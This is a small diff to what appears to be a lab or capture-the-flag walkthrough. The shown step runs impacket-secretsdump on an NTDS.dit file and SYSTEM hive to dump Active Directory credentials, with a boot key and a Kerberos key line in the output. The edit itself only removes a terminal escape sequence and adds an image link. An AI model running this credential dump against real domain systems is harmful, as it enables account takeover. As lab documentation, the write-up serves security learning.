@@ -269,7 +269,7 @@ Step19. Now we will extract the secrets via impacket command and we will get our
 
 ┌──(root㉿kali)-[/home/arjun/Downloads/cyber/NTDS]
 └─# impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
-^[[6~Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
@@ -313,3 +313,4 @@ JUMP01$:des-cbc-md5:a715e9eaf761b083
 [*] Cleaning up...
 ```
 
+![[Pasted image 20260810212904.png]]
